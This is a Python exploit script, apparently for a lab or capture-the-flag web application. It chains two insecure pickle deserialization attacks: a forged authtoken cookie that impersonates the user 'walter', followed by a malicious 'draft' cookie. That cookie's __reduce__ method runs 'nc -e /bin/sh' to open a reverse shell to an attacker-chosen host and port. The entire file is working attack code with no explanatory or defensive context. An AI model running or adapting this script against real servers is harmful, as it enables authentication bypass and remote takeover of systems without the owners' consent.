#!/usr/bin/env python3 

import pickle
import subprocess
import base64
import requests 
import traceback
import argparse
from urllib.parse import urljoin 

def pickleInsecureDesAuthBypass(target):
    """
    Generate Python's pickle serialized object 
    """
    # JSON object - existing account details 
    json_acc_details = {
        "auth": 1, # change status to `1` instead of `0` 
        "userid": "905b4296-e591-4b81-8ad6-b9abf90bf07d" # walter's user ID returned from `/api/sqeaks`
    }

    # Serialize walter's account details to pickle (protocol 3 for compatibility with Python 3.x)
    acc_details_pickled = pickle.dumps(json_acc_details, protocol=3)

    # Base64 encode the acc_details_pickled data
    acc_details_pickled_b64_encoded = base64.b64encode(acc_details_pickled).decode("utf-8")

    """
    Authenticate as `walter` 
    """
    profile_url = urljoin(target, "/api/profile")
    cookies = {"authtoken": f"{acc_details_pickled_b64_encoded}"}
    headers = {"authtoken": f"{acc_details_pickled_b64_encoded}"}
    try:
        profileRes = requests.get(profile_url, headers=headers, cookies=cookies, allow_redirects=False)
        if "\"username\": \"walter\"" in profileRes.text and profileRes.status_code == 200:
            print("[+] Authenticated as `walter`")
            print("[+] Authentication Token: ", cookies)
            return acc_details_pickled_b64_encoded
        else:
            print("[-] Failed to authenticate as `walter`")
    except Exception as e:
        print("[-] Error sending the /api/profile reqeust: ", e)
        traceback.print_exc()

class Gen(object):
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return subprocess.Popen, (self.payload,)

def draftCookiePickleInsecureDesRce(target, lhost, lport, authtoken):
    """
    Generate the `draft` cookie malicious serialized object 
    """
    # Payload is a tuple, same as peas.py’s .pick()
    revShellPayload = ("nc", "-e", "/bin/sh", f"{lhost}", f"{lport}")

    # Pickle with protocol=4
    revShellPayloadPickled = pickle.dumps(Gen(revShellPayload), protocol=4)

    # Base64 encode
    revShellPayloadPickledB64Encoded = base64.b64encode(revShellPayloadPickled).decode()
    """
    Exploit the insecure deserialization in the `draft` cookie to gain a reverse shell 
    """
    draftUrl = urljoin(target, "/api/draft")
    draftRceCookies = {"authtoken": f"{authtoken}", "draft": f"{revShellPayloadPickledB64Encoded}"}
    headers = {"authtoken": f"{authtoken}"}
    try:
        print("[*] Sending the malicious pickled serialized object...")
        print("[+] Draft cookie: ", draftRceCookies["draft"])
        requests.get(draftUrl, headers=headers, cookies=draftRceCookies)
        print(f"[+] Payload Sent. Check you listener {lhost}:{lport}")
    except Exception as e:
        print("[-] Error sending the malicious serialized pickle object draft request: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Python pickle insecure deserialization authentication bypass, and draft cookie insecure deserialization RCE")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')
    parser.add_argument("lport", help='Netcat listener port')
    args = parser.parse_args()

    authentication_token = pickleInsecureDesAuthBypass(args.target)
    if authentication_token:
        draftCookiePickleInsecureDesRce(args.target, args.lhost, args.lport, authentication_token)
    else:
        print("[-] Failed to authenticate. Existing...")

if __name__ == "__main__":
    main()
